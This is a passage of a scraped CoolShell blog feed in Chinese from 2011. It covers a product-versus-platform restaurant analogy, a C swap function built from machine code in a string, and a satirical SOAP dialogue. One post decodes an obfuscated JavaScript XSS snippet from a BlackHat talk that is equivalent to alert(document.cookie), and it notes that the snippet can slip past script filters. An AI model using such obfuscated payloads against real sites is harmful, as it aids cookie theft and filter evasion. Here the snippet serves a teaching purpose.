<li><strong>产品 + 服务 -&gt; 用户 -&gt; 开发人员 + 运营代理</strong></li>
</ul>
<p>我不认为Apple的经验无法复制，而是这样的模式很多很多，<strong>这个世界上有很多IT公司做到最后才发现，只有把产品和服务一同打包，才是用户想要的</strong>。</p>
<p>——————————————————</p>
<p>这就是<a href="https://coolshell.cn/articles/3363.html" target="_blank">Apple的简单之道</a>，上述内容素材取材于我和我老婆的对话（我老婆是文科，对编程不懂，她正是我了解最终用户的对象，也是我<a href="https://coolshell.cn/articles/3236.html" target="_blank">锻炼沟通</a>的对象）。下面是相关原始对话：</p>
<p><strong>我</strong>：问个问题，如果有两家餐馆，你会先那家？</p>
<ul>
<li>第一家餐馆是开放的，怎么个开放呢？厨师可能是任何想做菜的人，有做的好的，也有做不好的。餐馆的厨房里的配置也是各式各样的，厨师甚至可以自带设备，反正，什么样的厨房用具都支持。另外，该餐馆有四个订餐电话，不过，不同的订餐电话都不一定都订到菜单上所有的菜，因为这个餐馆不但把厨房给开放出去了，订餐的方式也开放出去了。进餐体验方面，不同的分店有不同的样子。</li>
</ul>
<ul>
<li>第二家餐馆是封闭的，不过他也对外面的厨师开放，并和厨师一同分成。厨师里的用具是餐馆定制好的，厨师要做菜，必需先交100美金的审核费，餐馆派专人审核厨师做的每一道菜，包括工序。每个餐厅的环境非常友好，也很简单，而且能让人感到非常不错的进餐体验，所有的分店都是一样。订餐电话只有一个，可以完成一键订餐。当然，第二家店要贵点。</li>
</ul>
<p><strong>老婆</strong>：你说的第一家就是那种像“大食代”的各种小吃拼起来的地儿吧？第二家就是像麦当劳， 必胜客，或是一些正规地像“海底捞”、“江南春”这样的店吧。第一家的店么就是顺便吃吃，要真正吃东西，还是要去第二种店。老公，难得你今天请我吃饭，我看就吃你说的第二种吧。（我晕，又把自己给绕进去了）</p>
<p>——————————————正文分割线——————————————</p>
<p>P.S. 有的朋友说我是C/C++出生，就是看不起Java。这样说我太小看我了，我的文章风格从来都是以一种调侃的方式，因为我觉得这样的文章会比那些枯燥的技术文章更有意思。我调侃C++和程序员的文章不比调侃Java要少，我对C++的观点从来都是C++是一门很不成熟的半成品语言！Java则要比它成熟的多得多，不过Java的跨平台和性能上的确是有很多东西可以调侃。</p>
<p><strong>（请勿将本文用于商业用途，转载时注明作者和出处）</strong></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/17066.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_title">关于移动端的钓鱼式攻击</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12225.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_title">DHH 谈混合移动应用开发</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5089.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5089.html" class="wp_rp_title">10个必需的iOS开发工具和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4334.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4334.html" class="wp_rp_title">Eclipse开发Android应用程序入门:重装上阵</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4270.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4270.html" class="wp_rp_title">Eclipse开发Android应用程序入门</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3589" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="5d83051bfb">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>15</strong> 人打了分，平均分： <strong>4.20</strong> )<br><span class="post-ratings-text" id="ratings_3589_text"></span><meta itemprop="name" content="食客还是大厨">
<meta itemprop="headline" content="食客还是大厨">
<meta itemprop="description" content="（请勿将本文用于商业用途，转载时注明作者和出处）

昨天我在文章《Android将允许纯C/C++开发应用》中发表了一些“很不中听”的观点，在我早晨上班刚打开电脑的时候，Gtalk上同学就发来了一条信息“android  为啥不用C/C++的原因是，android是开放式系统，为了能够跨平台。如果整回C/C++，那么windows  mobile就是前车之鉴。”，于是和同学展了争论，同学的意思...">
<meta itemprop="datePublished" content="2011-01-25T08:46:45+08:00">
<meta itemprop="dateModified" content="2011-01-26T09:46:48+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3589.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3589.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.2">
<meta itemprop="ratingCount" content="15">
</div>
</div>
<div id="post-ratings-3589-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-25T08:46:45+08:00</pubDate>
<guid>https://coolshell.cn/articles/3589.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一段Javascript的代码 ]]></title>
<link>https://coolshell.cn/articles/3540.html</link>
<content><![CDATA[ 
<p>我们先看一段Javascript的代码，如下所示：（你能看出来这是干什么的？）</p>
<p>[javascript]($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+<br>
($$=($_=!”+$)[_/_]+$_[+$])])()[__[_/_]+__<br>
[_+~$]+$_[_]+$$](_/_)[/javascript]</p>
<p>这段代码来自<a href="https://www.blackhat.com/html/bh-dc-11/bh-dc-11-home.html" target="_blank">BlackHat DC 2011</a>（(黑帽安全大会，全世界最大两个黑客大会之一，另一个是Defcon）中的一个叫<a href="https://www.blackhat.com/html/bh-dc-11/bh-dc-11-speaker_bios.html#Barnett" target="_blank">Ryan Barnett</a>黑客做的<a href="https://docs.google.com/viewer?url=http://www.modsecurity.org/documentation/XSS_Street_Fight-Ryan_Barnett-BlackhatDC-2011.pdf&amp;embedded=true&amp;chrome=true" target="_blank">XSS Street-Fight</a>！的演讲(XSS是Web上比较经典的跨站式攻击，操作起来也有些复杂)，一共69页，基本上都是一些比较枯燥的Javascript，不过这段代码挺有意思的，如果上面这段代码换个样子：</p>
<p>[javascript]($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+<br>
($$=($_=!”+$)[_/_]+$_[+$])])()[__[_/_]+__<br>
[_+~$]+$_[_]+$$](document.cookie)[/javascript]</p>
<p>你看到了document.cookie，于是你可能会想到这是偷用户帐号免登录cookie的。是的，就是这样。答案是，这代码等价于alert(document.cookie)，而最上面的那个代码等价于alert(1)——当然，还不仅仅只是alert。看到这里，你可能会想起<a title="6个变态的C语言Hello World程序 " href="https://coolshell.cn/articles/914.html" target="_blank">变态的C语言Hello World程序</a>，以及<a title="如何加密/混乱C源代码" href="https://coolshell.cn/articles/933.html">如何加密/混乱C源代码</a>，是的，这回的这个是Javascript版的，混乱Javascript的会比混乱C的更难懂，因为Javascript的变量类型是可以乱用的。</p>
<p>好，下面让我们来对这个代码做个解析。</p>
<p><span id="more-3540"></span>首先，我们先明确一点，在Javascript和C中，混乱后的代码都是要使用一个或多个下划线（_）来当变量名使用的，所以，请把其中的下划线看成变量名。</p>
<p>其次，这段代码可以分成两个部分，第一个部门其实就是sort()，第二个部分才是alert()</p>
<p>[javascript title=”sort()”]($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+<br>
($$=($_=!”+$)[_/_]+$_[+$])])()[/javascript]</p>
<p>[javascript title=”alert()”][__[_/_]+__[_+~$]+$_[_]+$$](_/_)[/javascript]</p>
<p>我们来看看细节的解释。</p>
<ul>
<li>$=[] 是一个空数组</li>
<li>$=[$=[]] 是一个引用空数组的数组。所以 $ 的解引用就是数字 0。</li>
<li>__ =  (__ = !$ + $ )   等价于字符串”false”</li>
<li>_ = -~-~-~$    中~是位运算符“非”，~$等于-1，所以-~$ 就是+1，基本上来说，~N就是 -(N+1)，所以这个表达式的值为3。</li>
<li>因为_ = 3，所以 _/_ = 3/3 = 1</li>
</ul>
<p>于是：</p>
<ul>
<li>(__ = !$ + $ )[ _ = -~-~-~$]</li>
<li>(“false”)[_]</li>
<li>(“false”)[3]</li>
<li>“false”[3] = s</li>
</ul>
<p>而：</p>
<ul>
<li>({} + $)[_/_]</li>
<li>(” object”)[_/_]</li>
<li>(” object”)[1]</li>
<li>” object”[1] = o</li>
</ul>
<p>再来：</p>
<ul>
<li>$ = ( $_ = !” + $)[_/_]</li>
<li>$ = ( “true”)[1]</li>
<li>“true”[1] = r</li>
</ul>
<p>最后：</p>
<ul>
<li>$_[+$] = “true”[0] = t</li>
</ul>
<p>因为</p>
<p>($$ = ( $_ = !” + $)[_/_] + $_[+$] ))</p>
<p>所以我们可以经过下面的推算得出$$的值</p>
<ul>
<li>!” = “true”</li>
<li>$_ = (true)</li>
<li>$_[1] = r</li>
<li>$_[0] = t</li>
<li>$$ = rt</li>
</ul>
<p>所以第一部分就成了 sort()，也就是以下的代码</p>
<p>[javascript]($ = [ $=[]] ["s" + "o"+ "r"+ "t" ] )()[/javascript]</p>
<p>Sort 接受一个作为函数的参数来运行，从而执行了第二部份。</p>
<p>[__[_/_]+__[_+~$]+$_[_]+$$](_/_)</p>
<p>我们知道：</p>
<ul>
<li>$ = 0</li>
<li>_ = 3</li>
<li>__ = “false”</li>
<li>$! = “true”</li>
<li>$$ = “rt”</li>
</ul>
<p>[__[_/_]+__[_+~$]+$_[_]+$$](_/_)</p>
<p>等价于<br>
[__[1] + __[3 + -1] + $![3] + $$)(1);</p>
<p>等价于<br>
[“false”[1] + “false”[3 + -1 ] + “true”[3] + “rt”] (1)</p>
<p>等价于<br>
[ a + l + e + r + t ](1)</p>
<p>等价于<br>
alert(1)</p>
<p>就是这样！于是这段代码可能绕过你的一些对Javascript的检查。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17524.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_title">如何读懂并写出装逼的函数式代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10822.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_title">函数式编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10739.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10739.html" class="wp_rp_title">Lua简明教程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10337.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_title">数据即代码：元驱动编程</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3540" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="646723f5a6">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>12</strong> 人打了分，平均分： <strong>3.33</strong> )<br><span class="post-ratings-text" id="ratings_3540_text"></span><meta itemprop="name" content="一段Javascript的代码">
<meta itemprop="headline" content="一段Javascript的代码">
<meta itemprop="description" content="我们先看一段Javascript的代码，如下所示：（你能看出来这是干什么的？）

[javascript]($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+
($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__
[_+~$]+$_[_]+$$](_/_)[/javascript]

这段代码来自BlackHat DC ...">
<meta itemprop="datePublished" content="2011-01-26T08:39:39+08:00">
<meta itemprop="dateModified" content="2011-01-24T21:05:29+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3540.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3540.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.33">
<meta itemprop="ratingCount" content="12">
</div>
</div>
<div id="post-ratings-3540-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-26T08:39:39+08:00</pubDate>
<guid>https://coolshell.cn/articles/3540.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言函数实现的另类方法 ]]></title>
<link>https://coolshell.cn/articles/3572.html</link>
<content><![CDATA[ 
<p>在前面看过那个<a href="https://coolshell.cn/articles/3540.html" target="_blank">BT的Javascript程序</a>后，我们来看一个C语言的，相信大家还记得<a title="输出从1到1000的数" href="https://coolshell.cn/articles/3445.html" target="_blank">输出从1到1000的数</a>最后的那个示例，本站还有很多这样的示例，如：<a href="https://coolshell.cn/articles/914.html" target="_blank">变态的hello word</a>，<a href="https://coolshell.cn/articles/2420.html" target="_blank">如何教新手编程</a>，<a href="https://coolshell.cn/articles/1724.html" target="_blank">还有恐怖的C++</a>，在下面这个示例面前，神马都是浮云。</p>
<p>下面这个示例向你展示了如何写一个swap()函数（把两个值交换），这段代码在我的Linux下的 gcc v4.1.1下可以正确编译通过，连一个Warning都没有，而且可以正确工作。我能说什么？！C语言并不疯狂，疯狂的是程序员。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
void(*swap)() = (void(*)()) "\x8b\x44\x24\x04\x8b\x5c\x24\x08\x8b\x00\x8b\x1b\x31\xc3\x31\xd8\x31\xc3\x8b\x4c\x24\x04\x89\x01\x8b\x4c\x24\x08\x89\x19\xc3";

int main(){ // works on GCC 3+4
        int a = 37, b = 13;
        swap(&amp;a, &amp;b);

        printf("%d %d\n",a,b);
}</pre>
<p>其实，这种<strong>用字符串来实现函数的方法</strong>，在原理上是很好理解的。</p>
<p><span id="more-3572"></span></p>
<p>字符串就是一段内存空间，把一个字符串指针强转成函数指针，那么这个指针所指向的内容就是各种指令，因此，那堆乱七八糟的东西说白了就是汇编。8086的汇编。你可以使用<span style="font-family: Consolas, Monaco, 'Courier New', Courier, monospace; line-height: 18px; font-size: 12px; white-space: pre;">ndisasm</span>来看看。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># ruby -e "print \"\x8b\x44\x24\x04\x8b\x5c\x24\x08\x8b\x00\x8b\x1b\x31\xc3\x31\xd8\x31\xc3\x8b\x4c\x24\x04\x89\x01\x8b\x4c\x24\x08\x89\x19\xc3\"" | ndisasm -u -

00000000  8B442404          mov eax,[esp+0x4]       ; load pointers to two parameters into eax, ebx
00000004  8B5C2408          mov ebx,[esp+0x8]

00000008  8B00              mov eax,[eax]           ; load values of two parameters from pointers (*eax, *ebx) into eax, ebx
0000000A  8B1B              mov ebx,[ebx]

0000000C  31C3              xor ebx,eax             ; swap two values (eax, ebx) using xor trick
0000000E  31D8              xor eax,ebx
00000010  31C3              xor ebx,eax

00000012  8B4C2404          mov ecx,[esp+0x4]       ; load pointer to param 1 into ecx
00000016  8901              mov [ecx],eax           ; store swapped value 1 (eax) into param 1 (*ecx)

00000018  8B4C2408          mov ecx,[esp+0x8]       ; load pointer to param 2 into ecx
0000001C  8919              mov [ecx],ebx           ; store swapped value 2 (ebx) into param 2 (*ecx)

0000001E  C3                ret</pre>
<p>注意：这段汇编中使用了XOR而不是引入第三个变量来完成了变量值的交换。</p>
<p>关于XOR的方式，参看下面的示例：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">a = a^b;
b=a^b;
a=b^a; </pre>
<p>或者更为简单的：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">a^=b^=a^=b;</code></p>
<p>(全文完)</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3572" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="581ba1b697">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>6</strong> 人打了分，平均分： <strong>3.67</strong> )<br><span class="post-ratings-text" id="ratings_3572_text"></span><meta itemprop="name" content="C语言函数实现的另类方法">
<meta itemprop="headline" content="C语言函数实现的另类方法">
<meta itemprop="description" content="在前面看过那个BT的Javascript程序后，我们来看一个C语言的，相信大家还记得输出从1到1000的数最后的那个示例，本站还有很多这样的示例，如：变态的hello word，如何教新手编程，还有恐怖的C++，在下面这个示例面前，神马都是浮云。

下面这个示例向你展示了如何写一个swap()函数（把两个值交换），这段代码在我的Linux下的 gcc v4.1.1下可以正确编译通过，连一个Wa...">
<meta itemprop="datePublished" content="2011-01-26T13:38:20+08:00">
<meta itemprop="dateModified" content="2011-01-26T18:14:17+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3572.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3572.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.67">
<meta itemprop="ratingCount" content="6">
</div>
</div>
<div id="post-ratings-3572-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-26T13:38:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/3572.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ SOAP的S是Simple ]]></title>
<link>https://coolshell.cn/articles/3585.html</link>
<content><![CDATA[ 
<p>曾经有一个争论，一边是站在SOAP这边的人，另一边则是其它人。 站在SOAP这边人，当他们在争论SOAP和Web Service框架的复杂度时，SOAP这边的人说，在引入那些WS-*东东之前，SOAP的确是简单的，这就是为什么SOAP的第一个字母S就是Simple。</p>
<p>在2000年的时候，有一个苦恼的程序员，</p>
<p><strong>程序员</strong>: 不好意思，我的老板这周末去打高尔夫了，现在我不得不要搞一个SOAP的应用，但是我根本不知道什么是SOAP。SOAP专家，你能帮我吗？</p>
<p><strong>SOAP专家</strong>: 当然可以。首先，我要告诉你，SOAP 就是 Simple Object Access Protocol.</p>
<p><strong>程序员</strong>: 哦，那么说来，他是简单的罗？</p>
<p><strong>SOAP专家</strong>: 简单的就像星期天一样，我的朋友。</p>
<p><strong>程序员</strong>: OK，快跟我说说。</p>
<p><strong>SOAP专家</strong>: 好，就像他的名字一样，SOAP用为远程对象访问。</p>
<p><strong>程序员</strong>: 像CORBA一样？</p>
<p><strong>SOAP专家</strong>: 正是如此，就是像 CORBA，只是更简单。不需要复杂的传输协议，还要设置防火墙，SOAP用的是HTTP。而且我们用的是XML作为传输数据格式而不是二进制。</p>
<p><span id="more-3585"></span></p>
<p><strong>程序员</strong>: 听起来很不错哦，告诉我它是怎么工作的？</p>
<p><strong>SOAP专家</strong>: 没问题。首先，有一个SOAP信封，其相当的简单。就是一个XML文件由head和body组成。在body中进行你的RPC调用。</p>
<p><strong>程序员</strong>: 哦，这就是所有的RPC的东西？</p>
<p><strong>SOAP专家</strong>: 确对是的。就像我所说的，你的RPC调用的方法名和其参数都需要写的这个XML文档的body中。方法名是在最外层的tag，每一个嵌套的子tag就是其参数。并且所有参数的类型都可以被指定，请看能规格说明书的第五节。</p>
<p><strong>程序员</strong>: (阅读第五节) 还好，不算太坏。</p>
<p><strong>SOAP专家</strong>: 现在，当你的服务开发完后，你需要指定endpoint.</p>
<p><strong>程序员</strong>: Endpoint?</p>
<p><strong>SOAP专家</strong>: Endpoint, 就是服务的地址。你需要使用HTTP的 POST 方法把SOAP 信封放到 endpoint的 URL.</p>
<p><strong>程序员</strong>: 如果我使用HTTP的GET方法什么怎么样？</p>
<p><strong>SOAP专家</strong>: 不知道，使用GET的行为 undefined.</p>
<p><strong>程序员</strong>: 哼哼。那么，要是我把我的服务移到别的 endpoint上？我是否可以得到一个301错误？</p>
<p><strong>SOAP专家</strong>: 不会的，SOAP不会返回HTTP的错误码。</p>
<p><strong>程序员</strong>: 那么，当你说SOAP使用HTTP，你的意思是说SOAP在HTTP打了个洞？</p>
<p><strong>SOAP专家</strong>: 哦，别说得那么难听，应该说， SOAP 是一个传输协议。</p>
<p><strong>程序员</strong>: HTTP 就不是吗？那是应用层的协议啊。总之，SOAP支持了别的什么传输协议？</p>
<p><strong>SOAP专家</strong>: 官方地来说没有。但是你可以潜在地支持任何的协议。而且有许多的平台支持JMS，FTP还有SMTP。</p>
<p><strong>程序员</strong>: 有人用那那些协议吗？</p>
<p><strong>SOAP专家</strong>: 嗯，没有。不过，我想表达的是，你能够。</p>
<p><strong>程序员</strong>: 好吧。关于 SOAPAction HTTP header，这是用来做什么的？</p>
<p><strong>SOAP专家</strong>: 老实说，没人真正的知道。</p>
<p><strong>程序员</strong>: 那么，那些 ‘actor’ 和 ‘mustUnderstand’ 属性，是否有人用呢？</p>
<p><strong>SOAP专家</strong>: 没有，真的没人用。你就忽略这些东西吧。</p>
<p><strong>程序员</strong>: 好吧，让我现读一读SOAP的规格说明书。</p>
<p>(程序员阅读中……)</p>
<p><strong>程序员</strong>: 好了，我现在几乎可以做个简单的东西了，但是我不能说我喜欢这个远程过程调用RPC的方法以及其序列化对象的方式 。</p>
<p><strong>SOAP专家</strong>: RPC！对象序列化！你从哪得到的SOAP就是一堆RPC的这种印象？! SOAP是关于基于文档的消息传递啊，我的朋友。</p>
<p><strong>程序员</strong>: 但是，这是你说的……</p>
<p><strong>SOAP专家</strong>: 忘了我所说的吧。现在，让我们谈谈消息传递吧。其消息格式遵守XML Schema，我们把之称为新型的文件格式。</p>
<p><strong>程序员</strong>: XML Schema?</p>
<p><strong>SOAP专家</strong>: 哦，这是很不错的东西，未来的头等技术，你应该看一下。</p>
<p><strong>程序员</strong>: (阅读 Schema 规格说明书). 上帝保佑我们！就算是亚历山大帝也搞不定它啊。</p>
<p><strong>SOAP专家</strong>: 不必太担心。会有专门的工作为你来创建XML Schema。真的，这只不过就是工具上的事。</p>
<p><strong>程序员</strong>: 工具是怎么做的？</p>
<p><strong>SOAP专家</strong>: 好吧，他们反映了你的代码，并自动生成Schema。</p>
<p><strong>程序员</strong>: 反映了我的代码？我以为这只是文档，而不是对象序列化。</p>
<p><strong>SOAP专家</strong>: 你没听我说吗？这只不是工具上的事。总之，我们不能期望你来手写 XML Schema 和 WSDL。另外，这其实就是一种校正测量。你不需要读的。</p>
<p><strong>程序员</strong>:  喔喔，等一下，你刚才说的那个单词是什么？ Wizzdle?</p>
<p><strong>SOAP专家</strong>: 哦，我没有说过吗？WSDL. Web Services Description Language. 它让你指定你的数据类型，参数，操作名，传输绑定，以及endpoint URI，这样，所有的客户程序员就可以访问你的服务了。你应该看看。</p>
<p><strong>程序员</strong>: (阅读WSDL 规格说明书)。我相信那个写下这个文章的人已经被枪杀了。其内部说明都不一致。而且，其用的是HTTP GET绑定，你不是和我说过， GET 是 undefined吗.</p>
<p><strong>SOAP专家</strong>: 不必担心那个，没人会用那玩意。总之，工具会帮你生成WSDL，而且在WDSL里会有Schema的。</p>
<p><strong>程序员</strong>: 但是，不应该用别的方法吗？不应该是先设计好接口然后再是生成代码吗？</p>
<p><strong>SOAP专家</strong>: 是的，我猜那在原则上听起来是对的。但做起来并不容易，只有很少的SOAP栈支持先开发WSDL。让工具为这个事操心去吧。</p>
<p><strong>程序员</strong>: 还有一个问题。如果我们传递 XML Schema 的消息，我们在哪里指写操作名？</p>
<p><strong>SOAP专家</strong>: 好吧，你还记得 SOAPAction HTTP header吗? 绝大多数的人把操作名放在那里。</p>
<p><strong>程序员</strong>: 大多数人？</p>
<p><strong>SOAP专家</strong>: 嗯，这种新型并不会被写在所有的地方。</p>
<p><strong>程序员</strong>: 我注意到你们整个SOAP界有很多的模糊和歧意，有些地方还是错的，并没有标准的规格说明书。实际上， SOAP 和 WSDL 规格说明书只是 W3C 的笔记罢了，连草稿都不是。</p>
<p><strong>SOAP专家</strong>: 我们还在继续中。</p>
<p><strong>程序员</strong>: 这个真的能行吗？能承诺吗？</p>
<p><strong>SOAP专家</strong>: 绝对没有问题。</p>
<p><strong>程序员</strong>: 好吧，那我去试试。</p>
<p>(不久以后……)</p>
<p><strong>程序员</strong>: 事情变得很恶心。我这边的工具生成的WDSL居然不能被我同事的工具使用。还不仅仅是这个，其生成的XML Schemas 无法重用。而且，好像没有工具可以最好的处理SOAPAction header.</p>
<p><strong>SOAP专家</strong>:  很报歉，兄弟。在光明的那一面，没人用这些文件。为了让传输独立，我们所有人都用包装好的文件。听着是不是很酷：包装好的文件？</p>
<p><strong>程序员</strong>: 那是什么？</p>
<p><strong>SOAP专家</strong>: 就像是原来那样，只不过，你整个消息被 包装起来成一个元素，其和操作有一样的名字。现在操作名和消息成了一体了。</p>
<p><strong>程序员</strong>: 好吧，请问说明书在哪里？</p>
